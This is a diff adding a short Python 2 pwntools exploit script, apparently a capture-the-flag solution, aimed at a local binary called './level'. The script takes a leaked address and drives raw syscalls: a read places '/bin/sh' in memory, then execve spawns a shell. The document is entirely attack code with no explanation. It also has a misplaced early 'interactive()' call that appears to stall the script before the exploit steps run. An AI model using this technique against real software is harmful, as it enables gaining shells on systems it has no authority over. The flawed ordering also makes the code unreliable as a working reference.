@@ -1,0 +1,26 @@
+#!/usr/bin/env python2
+
+from pwn import *
+
+target = process("./level")
+target.readuntil("0x")
+addr = int('0x'+target.readline().strip(), 16)
+
+def exec_syscall(num =0, rdi =0, rsi =0, rdx =0, r10 =0, r8 =0, r9 =0):
+    target.send(p64(num))
+    target.send(p64(rdi))
+    target.send(p64(rsi))
+    target.send(p64(rdx))
+    target.send(p64(r10))
+    target.send(p64(r8))
+    target.send(p64(r9))
+
+target.interactive()
+
+shell = "/bin/sh\x00"+p64(addr)
+exec_syscall(0, 0, addr, len(shell))
+target.send(shell)
+
+exec_syscall(59, addr, addr+len(shell)-8, 0)
+
+target.interactive()
